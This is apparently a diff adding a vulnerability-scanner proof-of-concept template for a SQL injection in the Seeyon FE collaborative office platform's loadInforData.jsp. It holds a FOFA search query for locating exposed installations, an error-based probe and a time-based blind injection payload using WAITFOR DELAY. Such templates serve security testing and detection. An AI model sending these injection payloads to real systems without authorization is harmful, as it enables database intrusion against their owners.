@@ -1,0 +1,20 @@
+id: poc-yaml-seeyon-hulian-fe-loadinfordata-sqli
+info:
+  name: 致远互联FE协作办公平台 loadInforData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-FE
+  fofa: app="致远互联-FE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /cooperate/flow/loadInforData.jsp?guid=1%27
+  expression: status_code == 500 && contains(body,"SQLServerException:")
+- method: GET
+  path: /cooperate/flow/loadInforData.jsp?guid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: status_code == 200 && trim(body) == "" && duration > t1 && duration
+    < t2
+transport: http
